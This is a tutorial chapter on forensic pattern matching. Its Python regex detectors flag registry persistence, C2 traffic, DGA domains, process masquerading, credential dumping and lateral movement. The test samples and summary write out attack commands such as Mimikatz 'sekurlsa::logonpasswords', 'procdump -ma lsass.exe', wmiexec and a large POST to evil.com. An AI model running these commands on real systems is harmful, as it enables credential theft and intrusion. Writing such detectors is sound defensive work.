# Part 85: Forensics & Memory Pattern Analysis

> **ระดับ:** ผู้เชี่ยวชาญ-ระดับโลก | **เวลาเรียน:** ~100 นาที | **ข้อกำหนด:** Part 01-84

---

## 85.1 Windows Registry & Filesystem Forensics

```python
import re
from typing import Dict, List

print("Forensics & Memory Pattern Analysis:")
print("=" * 60)

print("\n1. Windows Registry artifact patterns:")

# Windows Registry key paths
REG_HIVE = re.compile(
    r'\b(?:HKEY_LOCAL_MACHINE|HKLM|HKEY_CURRENT_USER|HKCU|'
    r'HKEY_USERS|HKU|HKEY_CLASSES_ROOT|HKCR|'
    r'HKEY_CURRENT_CONFIG|HKCC)(?:\\[^\\]+)*',
    re.IGNORECASE
)

# Suspicious registry persistence keys
REG_PERSISTENCE = re.compile(
    r'(?:HKLM|HKCU)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\(?:'
    r'Run|RunOnce|RunOnceEx|RunServices|RunServicesOnce)|'
    r'HKLM\\SYSTEM\\CurrentControlSet\\Services\\[^\\]+\\(?:ImagePath|Start)|'
    r'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\(?:Userinit|Shell)|'
    r'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders',
    re.IGNORECASE
)

# Windows file paths
WIN_PATH = re.compile(
    r'[A-Za-z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]*'
)

# Suspicious Windows paths (living-off-the-land)
WIN_LOLBAS = re.compile(
    r'(?:cmd|powershell|wscript|cscript|mshta|regsvr32|rundll32|'
    r'msiexec|certutil|bitsadmin|wmic|schtasks|at\.exe|'
    r'net\.exe|net1\.exe|sc\.exe|reg\.exe)(?:\s|\.exe)',
    re.IGNORECASE
)

# Windows event log patterns
EVTX_EVENT_ID = re.compile(r'EventID[>\s=:]+(\d{3,5})')
EVTX_CREATOR  = re.compile(r'CreatorProcessName[>\s=:]+([^\r\n<]+)')
EVTX_CMDLINE  = re.compile(r'CommandLine[>\s=:]+([^\r\n<]+)')

# Known malicious EventIDs
SUSPICIOUS_EVENT_IDS = {
    4624: 'Successful logon',
    4625: 'Failed logon',
    4648: 'Logon with explicit credentials',
    4688: 'New process created',
    4698: 'Scheduled task created',
    4720: 'User account created',
    4728: 'User added to security group',
    4732: 'User added to local group',
    7045: 'New service installed',
    1102: 'Audit log cleared',
    4719: 'System audit policy changed',
}


def analyze_registry_artifact(text: str) -> List[str]:
    findings = []

    persist_m = REG_PERSISTENCE.search(text)
    if persist_m:
        findings.append(f'PERSISTENCE_KEY: {persist_m.group(0)[:80]}')

    lolbas_m = WIN_LOLBAS.search(text)
    if lolbas_m:
        findings.append(f'LOLBAS_BINARY: {lolbas_m.group(0)!r}')

    evid_m = EVTX_EVENT_ID.search(text)
    if evid_m:
        eid = int(evid_m.group(1))
        if eid in SUSPICIOUS_EVENT_IDS:
            findings.append(f'SUSPICIOUS_EVENT: {eid} ({SUSPICIOUS_EVENT_IDS[eid]})')

    return findings


registry_artifacts = [
    r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater = C:\Users\user\AppData\Roaming\svchosts.exe',
    r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = C:\Windows\system32\userinit.exe,C:\backdoor.exe',
    r'EventID=4698 TaskName=\WindowsUpdate CommandLine=powershell.exe -EncodedCommand base64stuff',
    r'HKLM\SYSTEM\CurrentControlSet\Services\malware_svc\ImagePath = C:\Windows\Temp\svc.exe',
    r'EventID=1102 SubjectUserName=administrator AuditLogCleared',
    r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\cleanup = cmd.exe /c del /f /q C:\payload.exe',
]

print(f"\n   Registry/EventLog analysis:")
for artifact in registry_artifacts:
    findings = analyze_registry_artifact(artifact)
    if findings:
        print(f"\n   [ALERT] {artifact[:70]!r}")
        for f in findings:
            print(f"     \u2192 {f}")
    else:
        print(f"   OK: {artifact[:70]!r}")
```

---

## 85.2 Network Forensics Patterns

```python
import re
from typing import Dict, List

print("\nNetwork Forensics Patterns:")
print("=" * 60)

# DNS query patterns
DNS_QUERY = re.compile(
    r'(?P<src>\d{1,3}(?:\.\d{1,3}){3})\s+\d+\s+IN\s+(?P<type>A|AAAA|MX|TXT|NS|CNAME|SOA|PTR)\s+(?P<name>[^\s]+)',
)

# DNS tunneling indicators (long subdomains)
DNS_TUNNEL = re.compile(
    r'\b(?:[a-f0-9]{20,}|[A-Za-z0-9+/]{30,})\.[a-zA-Z0-9\-]{2,63}\.[a-zA-Z]{2,6}\b'
)


def score_dga(domain: str) -> float:
    import math
    if '.' not in domain:
        return 0.0
    label = domain.split('.')[0]
    if len(label) < 5:
        return 0.0
    freq = {}
    for c in label:
        freq[c] = freq.get(c, 0) + 1
    entropy = -sum((v/len(label)) * math.log2(v/len(label)) for v in freq.values())
    vowels = sum(1 for c in label if c in 'aeiou')
    cv_ratio = vowels / len(label) if label else 0
    dga_score = entropy
    if cv_ratio < 0.2 or cv_ratio > 0.7:
        dga_score += 1.0
    return round(dga_score, 2)


# HTTP traffic patterns for C2 detection
C2_BEACONING = re.compile(
    r'(?:User-Agent:\s*(?:curl|python-requests|Go-http-client|libwww-perl|'
    r'Java|Wget|okhttp|axios)[^\r\n]*)',
    re.IGNORECASE
)

# Suspicious HTTP headers indicating C2
C2_HEADERS = re.compile(
    r'(?:X-Forwarded-For:\s*\d{1,3}\.\d{1,3}\.0\.1|'
    r'Host:\s*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
    r'Accept-Language:\s*[a-z]{2}-[A-Z]{2},\*;q=0\.\d+)',
    re.IGNORECASE
)

# Base64 in URI (often C2 data exfil)
BASE64_IN_URI = re.compile(r'/(?:[A-Za-z0-9+/]{20,}={0,2})(?:/|$|\?)')

# Large POST bodies (data exfiltration)
LARGE_POST = re.compile(r'Content-Length:\s*(\d+)')


def analyze_http_traffic(request: str) -> List[str]:
    findings = []

    c2_ua = C2_BEACONING.search(request)
    if c2_ua:
        findings.append(f'suspicious User-Agent: {c2_ua.group(0)[:60]}')

    c2_hdr = C2_HEADERS.search(request)
    if c2_hdr:
        findings.append(f'C2 header pattern: {c2_hdr.group(0)[:60]}')

    b64_m = BASE64_IN_URI.search(request)
    if b64_m:
        findings.append(f'base64 data in URI path: {b64_m.group(0)[:40]}')

    cl_m = LARGE_POST.search(request)
    if cl_m and int(cl_m.group(1)) > 1_000_000:
        findings.append(f'large POST body: {int(cl_m.group(1)):,} bytes (possible exfil)')

    return findings


http_samples = [
    'GET /update HTTP/1.1\nHost: 203.0.113.42\nUser-Agent: curl/7.68.0\n',
    'POST /api/v1/data HTTP/1.1\nHost: evil.com\nContent-Length: 5242880\nUser-Agent: python-requests/2.28',
    'GET /dGhpcyBpcyBiYXNlNjQgZGF0YQ==/config HTTP/1.1\nHost: c2.example.com\n',
    'GET /search?q=hello HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n',
]

print(f"\n   HTTP traffic analysis:")
for req in http_samples:
    findings = analyze_http_traffic(req)
    short = req.replace('\n', ' ')[:60]
    if findings:
        print(f"\n   [ALERT] {short!r}")
        for f in findings:
            print(f"     \u2192 {f}")
    else:
        print(f"   OK: {short!r}")


print(f"\n   DGA domain scoring:")
test_domains = [
    'google.com',
    'xkcd.com',
    'kjdhfkasjdhf.com',
    'a8f3b2c1d9e4f7a0.net',
    'facebook.com',
    'qwxzjhvkrpmnbgtf.ru',
]
for domain in test_domains:
    score = score_dga(domain)
    flag = 'SUSPICIOUS' if score > 3.5 else 'OK'
    print(f"   [{flag}] {domain!r} entropy={score}")
```

---

## 85.3 Memory Artifact Patterns

```python
import re
from typing import Dict, List

print("\nMemory Artifact Patterns:")
print("=" * 60)

# Windows process name anomalies (common masquerading)
PROC_MASQUERADE = re.compile(
    r'\b(?:'
    r'svch0st|svch0st\.exe|svchost32|svchost64|'
    r'lsas[s5]|lsass32|lsas\.exe|'
    r'csrss32|csrrs|'
    r'expl0rer|expl0rer\.exe|'
    r'wininit32|wininit64|'
    r'iexplor|iexplore32|'
    r'cmd32\.exe|cmd64\.exe|powershell32\.exe'
    r')\b',
    re.IGNORECASE
)

# PowerShell obfuscation patterns
PS_OBFUSCATION = re.compile(
    r'(?:'
    r'-[Ee]n[Cc](?:odedCommand)?|'
    r'-[Ww](?:indowStyle)?\s+[Hh]idden|'
    r'IEX\s*\(|Invoke-Expression\s*\(|'
    r'\[System\.Text\.Encoding\]::|'
    r'\[Convert\]::From[Bb]ase64|'
    r'Invoke-WebRequest|IWR\s+|'
    r'New-Object\s+System\.Net\.WebClient'
    r')',
    re.IGNORECASE
)

# Mimikatz/credential dumping indicators
CREDENTIAL_DUMP = re.compile(
    r'(?:'
    r'sekurlsa::|lsadump::|kerberos::|'
    r'privilege::debug|token::elevate|'
    r'procdump.*lsass|'
    r'comsvcs\.dll.*MiniDump|'
    r'vssadmin.*shadow|'
    r'ntdsutil.*ifm'
    r')',
    re.IGNORECASE
)

# Lateral movement patterns
LATERAL_MOVEMENT = re.compile(
    r'(?:'
    r'wmiexec|psexec|smbexec|dcomexec|'
    r'Invoke-WMIMethod|Get-WMIObject|'
    r'net use\\\\[^\\s]+\\ipc\$|'
    r'sc\\\\[^\\s]+\s+create|'
    r'schtasks\s+/Create.*/S\s+'
    r')',
    re.IGNORECASE
)


def analyze_process_activity(proc_info: str) -> List[str]:
    findings = []

    if PROC_MASQUERADE.search(proc_info):
        m = PROC_MASQUERADE.search(proc_info)
        findings.append(f'PROCESS_MASQUERADE: {m.group(0)!r}')

    if PS_OBFUSCATION.search(proc_info):
        m = PS_OBFUSCATION.search(proc_info)
        findings.append(f'POWERSHELL_OBFUSCATION: {m.group(0)!r}')

    if CREDENTIAL_DUMP.search(proc_info):
        m = CREDENTIAL_DUMP.search(proc_info)
        findings.append(f'CREDENTIAL_DUMPING: {m.group(0)!r}')

    if LATERAL_MOVEMENT.search(proc_info):
        m = LATERAL_MOVEMENT.search(proc_info)
        findings.append(f'LATERAL_MOVEMENT: {m.group(0)!r}')

    return findings


process_activities = [
    'Process: svch0st.exe PID=1234 PPID=svchost.exe Path=C:\\Windows\\Temp\\svch0st.exe',
    'powershell.exe -EncodedCommand JABhAD0AJwBIAGUAbABsAG8AJwA=',
    'mimikatz.exe sekurlsa::logonpasswords full',
    'cmd.exe /c "procdump -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"',
    r'wmiexec.py 192.168.1.10 cmd.exe /c whoami',
    'C:\\Windows\\system32\\svchost.exe -k netsvcs',
]

print(f"\n   Process/Memory activity analysis:")
for activity in process_activities:
    findings = analyze_process_activity(activity)
    if findings:
        print(f"\n   [ALERT] {activity[:70]!r}")
        for f in findings:
            print(f"     \u2192 {f}")
    else:
        print(f"   OK: {activity[:70]!r}")
```

---

## 85.4 สรุป Part 85

```
Forensics & Memory Pattern Analysis:

1. Windows Registry forensics:
   Run/RunOnce keys: common persistence mechanisms
   Winlogon Userinit/Shell: hijacked startup
   LOLBAS detection: living-off-the-land binaries
   Event 4624/4625: logon monitoring
   Event 1102: audit log cleared (always suspicious)

2. Network forensics:
   DGA detection: Shannon entropy > 3.5 + unusual consonant/vowel ratio
   DNS tunneling: long hex/base64 subdomain labels
   C2 beaconing: scripted User-Agents (curl, python-requests)
   C2 headers: IP-as-Host, malformed Accept-Language
   Exfiltration: base64 in URI path, large Content-Length

3. Process masquerading:
   svch0st.exe, lsas5.exe (zero/number substitution)
   Legitimate path: C:\Windows\System32\svchost.exe
   Malicious: C:\Windows\Temp\svchost.exe (wrong path)
   Parent check: Office spawning cmd/PowerShell = suspicious

4. Credential dumping (ATT&CK T1003):
   sekurlsa::logonpasswords (Mimikatz)
   procdump -ma lsass.exe (process dump)
   comsvcs.dll MiniDump (living-off-the-land dump)
   ntdsutil ifm (AD NTDS extraction)

5. Lateral movement (ATT&CK T1021):
   PsExec/WMIExec: remote command execution
   net use \\target\ipc$: admin share access
   schtasks /Create /S: remote scheduled tasks
   sc \\target create: remote service installation
```

---

*[\u2190 Part 84: Cryptographic Pattern Analysis](part-84-crypto-patterns.md) | [\u2192 Part 86: Malware Analysis Patterns](part-86-malware-analysis.md)*
